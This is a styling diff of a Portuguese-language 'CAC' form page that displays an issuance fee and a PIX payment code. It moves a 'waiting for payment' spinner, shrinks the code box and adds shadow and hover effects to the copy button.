@@ -25,11 +25,6 @@ body {
 <main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
         <!-- Formulário CAC -->
         <div class="mb-6" style="text-align: left;">
-                <!-- Spinner de status -->
-                <div style="text-align: center; margin-bottom: 24px; padding: 10px;">
-                    <div style="width: 30px; height: 30px; border: 3px solid #f3f4f6; border-top: 3px solid #DC9D33; border-radius: 50%; display: inline-block; animation: spinRotate 1s linear infinite; margin-bottom: 8px;"></div>
-                    <p style="color: #DC9D33; font-weight: 600; font-size: 16px; margin: 0;">Aguardando Pagamento</p>
-                </div>
                 
                 <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                     <label class="text-base" style="font-weight: 600; color: #374151;">REQUERENTE:</label>
@@ -74,6 +69,12 @@ body {
 
         <!-- QR Code PIX -->
         <div id="payment-details" class="hidden">
+            <!-- Spinner de status -->
+            <div style="text-align: center; margin-bottom: 16px; padding: 10px;">
+                <div style="width: 30px; height: 30px; border: 3px solid #f3f4f6; border-top: 3px solid #DC9D33; border-radius: 50%; display: inline-block; animation: spinRotate 1s linear infinite; margin-bottom: 8px;"></div>
+                <p style="color: #DC9D33; font-weight: 600; font-size: 16px; margin: 0;">Aguardando Pagamento</p>
+            </div>
+            
             <!-- Taxa de Emissão acima do QR Code -->
             <div class="text-center mb-2">
                 <p class="text-sm" style="color: #6b7280; font-weight: normal;">TAXA DE EMISSÃO: R$ 64,80</p>
@@ -89,14 +90,14 @@ body {
             <!-- Código PIX -->
             <div style="margin-bottom: 24px;">
                 <label class="text-base" style="display: block; font-weight: 500; color: #374151; margin-bottom: 8px;">Código PIX (Copia e Cola):</label>
-                <textarea id="pix-code" readonly rows="4"
+                <textarea id="pix-code" readonly rows="2"
                        class="text-base" style="width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 2px; background-color: #f9fafb; resize: none; font-family: monospace;" 
                        placeholder="Código será gerado..."></textarea>
                 <div style="text-align: center; margin-top: 12px;">
                     <button onclick="copyPixCode()" 
-                            class="text-lg" style="background-color: #059669; color: white; padding: 18px 36px; border-radius: 2px; border: none; cursor: pointer; font-weight: 500; transition: all 0.3s;"
-                            onmouseover="this.style.backgroundColor='#047857'" 
-                            onmouseout="this.style.backgroundColor='#059669'">
+                            class="text-lg" style="background-color: #059669; color: white; padding: 18px 48px; border-radius: 2px; border: none; cursor: pointer; font-weight: 500; transition: all 0.3s; box-shadow: 0 4px 8px rgba(0,0,0,0.2), 0 2px 4px rgba(0,0,0,0.1); transform: translateY(-1px);"
+                            onmouseover="this.style.backgroundColor='#047857'; this.style.boxShadow='0 6px 12px rgba(0,0,0,0.3), 0 3px 6px rgba(0,0,0,0.15)'; this.style.transform='translateY(-2px)';" 
+                            onmouseout="this.style.backgroundColor='#059669'; this.style.boxShadow='0 4px 8px rgba(0,0,0,0.2), 0 2px 4px rgba(0,0,0,0.1)'; this.style.transform='translateY(-1px)';">
                         <i class="fas fa-copy" style="margin-right: 8px;"></i>
                         Copiar Código PIX
                     </button>
